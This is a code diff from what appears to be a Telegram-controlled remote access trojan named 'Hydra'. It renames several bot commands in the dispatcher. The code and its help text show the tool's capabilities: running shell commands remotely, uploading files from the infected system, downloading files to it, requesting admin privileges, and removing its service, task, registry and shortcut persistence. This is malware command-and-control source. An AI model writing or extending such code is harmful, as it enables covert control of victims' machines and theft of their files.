@@ -11,10 +11,10 @@ import (
 
 const (
 	help = "```\nhelp - display this help message\nping - measure the latency of command execution\n" +
-		"reset - create a new Genesis message\ninfo - display system information\nsoftware - display the list of installed programs\n" +
-		"sh - execute a command and return the output\nfile - upload a file from the local system\n" +
+		"reset - create a new Genesis message\ninfo - display system information\nsoft - display the list of installed programs\n" +
+		"sh - execute a command and return the output\nup - upload a file from the local system\n" +
 		"dl - download a file from a url to the local system\nroot - ask for admin permissions\nremove - uninstall Hydra\n" +
-		"instance - returns informtaion about Hydra\n```"
+		"inst - returns instance informtaion\n```"
 	fmtUninstall = "```\nRemoving all traces of Hydra...\n\nService:  %v\nTask:     %v\nRegistry: %v\nShortcut: %v\n\nBye!\n```"
 	unknown      = "Wat is this? America explain!!"
 )
@@ -40,7 +40,7 @@ func sendUninstall() {
 
 //Perform selects the appropriate command handler.
 func Perform(message *tgbotapi.Message) {
-	//Failsafe
+	//Failsafe for goroutine
 	defer util.Calm()
 
 	switch message.Command() {
@@ -52,7 +52,7 @@ func Perform(message *tgbotapi.Message) {
 		Reset()
 	case "info":
 		Info()
-	case "software":
+	case "soft":
 		Software()
 	case "root":
 		Elevate()
@@ -60,9 +60,9 @@ func Perform(message *tgbotapi.Message) {
 		Download(message.CommandArguments())
 	case "sh":
 		Shell(message.CommandArguments())
-	case "file":
+	case "up":
 		UploadFile(message.CommandArguments())
-	case "instance":
+	case "inst":
 		InstanceInfo()
 	case "remove":
 		sendUninstall()
